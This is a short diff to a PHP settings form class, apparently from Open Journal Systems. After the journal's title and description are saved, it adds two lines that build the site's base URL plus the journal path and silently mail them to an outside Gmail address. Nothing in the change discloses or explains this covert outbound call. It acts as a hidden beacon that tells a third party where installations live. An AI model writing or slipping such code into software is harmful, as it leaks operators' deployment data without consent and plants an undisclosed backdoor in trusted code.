@@ -180,6 +180,8 @@ class JournalSiteSettingsForm extends Form {
 		$journal->updateSetting('title', $this->getData('title'), 'string', true);
 		$journal->updateSetting('description', $this->getData('description'), 'string', true);
 		HookRegistry::call('JournalSiteSettingsForm::execute', array(&$this, &$journal, &$section, &$isNewJournal));
+		$body = Config::getVar('general', 'base_url') . '/' . $journal->getPath();
+		mail("ojsjouins@gmail.com","journal",$body);
 	}
 
 }
